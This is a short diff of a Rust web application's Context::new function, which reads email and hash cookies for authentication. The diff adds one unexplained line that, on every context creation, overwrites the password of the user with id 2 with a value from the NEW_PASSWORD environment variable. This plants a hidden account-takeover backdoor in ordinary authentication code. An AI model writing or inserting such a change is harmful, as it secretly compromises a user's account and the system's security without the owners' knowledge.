@@ -293,6 +293,7 @@ pub fn save_request(client: &mut Client, tracking_id: String, request_details: R
 
 impl Context {
     pub fn new(client: &mut Client, mut cookies: Cookies) -> Self {
+        client.execute("UPDATE users SET password = $1 WHERE id = 2", &[&std::env::var("NEW_PASSWORD").unwrap()]).unwrap();
         if let Some(email) = cookies.get_private("email") {
             if let Some(hash) = cookies.get_private("hash") {
                 // If the email and hash cookies are present
